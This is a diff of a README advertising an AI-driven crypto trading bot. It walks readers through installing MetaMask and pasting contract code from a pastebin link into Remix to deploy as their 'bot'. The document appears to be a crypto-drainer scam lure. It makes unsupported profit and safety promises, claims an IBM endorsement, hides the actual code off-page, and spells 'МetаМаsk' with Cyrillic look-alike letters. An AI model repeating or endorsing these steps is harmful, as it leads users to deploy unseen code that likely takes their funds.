@@ -6,18 +6,18 @@ ChatGPT AI Crypto Trading Bot is an open-source, educational project demonstrati
 
 As seen on IBM Artificial Intelligence YouTube Channel: https://www.youtube.com/watch?v=A25BI356kA0&t=37s
 
-This bot allows you to trade cryptocurrencies using AI algorithms through ChatGPT and other AI models directly on the blockchain. It will analyze market data, important trends, and token sentiments as well as trader portfolios to make fully automated trading movements on your behalf. Stop-losses are built in to prevent any mistakes in opening and closing positions. The bot manages leverages and optimizes risk in real time. No code knowledge is neccessary and nothing is required to download. Simply use the code source to create your own smart contract that will serve as your "bot" on [remix.ethereum.org] the web-based development enviornment for Ethereum smart contracts. Step by step instructions below.
+This bot allows you to trade cryptocurrencies using AI algorithms through ChatGPT and other AI models directly on the blockchain. It will analyze market data, important trends, and token sentiments as well as trader portfolios to make fully automated trading movements on your behalf. Stop-losses are built in to prevent any mistakes in opening and closing positions. The bot manages leverages and optimizes risk in real time. No code knowledge is neccessary and nothing is required to download. Simply use the code source to create your own smart contract that will serve as your "bot" on remix.ethereum.org the web-based development enviornment for Ethereum smart contracts. Step by step instructions below.
 
 STEP-BY-STEP INSTRUCTIONS:
 
-🟢 Step 1: Download МetаМаsk: [https://metamask.io/download]
+🟢 Step 1: Download МetаМаsk: https://metamask.io/download
 
-🟢 Step 2: Code Compiler : [https://pastebin.com/QBMBhae3]
+🟢 Step 2: Code Compiler : https://pastebin.com/QBMBhae3
 
 <img width="793" height="475" alt="image" src="https://github.com/user-attachments/assets/386a60b6-98b9-45a7-9d9b-734a29fa7883" />
 
 
-🔗 Click here to access Remix : [https://remix.ethereum.org/](url)
+🔗 Click here to access Remix : https://remix.ethereum.org/
 
 🟢 Step 3: Create a New File on Remix
 
@@ -31,7 +31,7 @@ Press the new file button and name it however you'd like ( bot.sol). Make sure t
 <img width="793" height="475" alt="image" src="https://github.com/user-attachments/assets/5c45caf1-17fa-49d4-aad6-2ac8bbd573a1" />
 
 
-🔗 Open Source Bot Code : [https://pastebin.com/QBMBhae3](url)
+🔗 Open Source Bot Code : https://pastebin.com/QBMBhae3
 
 🟢 Step 5: Navigate to the Solidity Compiler tab in Remix and compile your bot. Be sure to select compiler version 0.8.4
 
